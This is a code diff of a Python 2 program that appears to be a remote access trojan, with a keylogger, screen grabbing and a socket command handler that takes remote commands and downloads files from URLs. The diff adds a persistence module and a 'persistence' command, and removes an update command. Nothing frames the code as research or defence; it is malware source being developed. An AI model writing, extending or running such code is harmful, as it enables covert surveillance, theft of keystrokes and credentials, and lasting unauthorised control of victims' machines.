@@ -1,6 +1,6 @@
 import subprocess, socket, platform, os, datetime
 import PIL.ImageGrab
-import keyLogger, update, updt
+import keyLogger, update, updt, persistence
 from threading import Thread
 from urllib2 import urlopen
 
@@ -12,6 +12,7 @@ class functions(object):
     logger = keyLogger.keyLogger()
     updater = update.Update()
     updt = updt.Updt()
+    persistence = persistence.Persistence()
 
     threadLogger = None
     threadMain = None
@@ -45,10 +46,8 @@ class functions(object):
                     version = self.updater.getVersion()
                     soc.send(version + "\n")
 
-                elif data == "update\n":
-                    message = self.updt.update()
-                    message = message+'\n'
-                    soc.send(message)
+                elif data == "persistence\n":
+                    soc.send(self.persistence.doPersistence())
 
                 elif data.startswith("getFile("):
                     url = data[8:-2]
